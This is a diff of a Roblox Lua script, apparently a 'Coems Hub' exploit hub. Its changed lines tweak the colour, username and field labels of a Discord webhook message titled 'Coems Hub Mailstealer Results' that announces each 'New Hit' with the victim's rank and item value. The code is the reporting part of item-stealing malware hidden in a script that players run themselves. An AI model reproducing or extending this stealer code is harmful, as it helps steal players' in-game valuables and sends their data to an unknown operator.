@@ -35,7 +35,7 @@ elseif game.PlaceId == 11725212117 then
 else
 	_G.GameIn = "❓ Couldn't find game"
 end
-local webhookcolor = "13369599"
+local webhookcolor = "5763719"
 local Players = game:GetService("Players")
 local Client = Players.LocalPlayer
 _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
@@ -51,7 +51,7 @@ local function sendwebhook(msg)
 local msg = {
 	["avatar_url"] = "https://cdn.discordapp.com/icons/1109197661652910210/c635dd13f1317b77ded3c73a19840db2.png",
   ["content"]= "**:money_mouth:New Hit With Coems Hub:money_mouth:** ||@here|| ",
-	["username"] = "Coems",
+	["username"] = "Coems Hub",
 	["embeds"]= {
 	  {
 		["title"]= "`Coems Hub Mailstealer Results`",
@@ -70,7 +70,7 @@ local msg = {
           ["inline"]= true
         },
         {
-          ["name"]= "**<:arrowup:1112767464640622686>Rap<:arrowup:1112767464640622686>**",
+          ["name"]= "**<:arrowup:1112767464640622686>RAP<:arrowup:1112767464640622686>**",
           ["value"]= "```"..RapFormated.."```",
           ["inline"]= true
         },
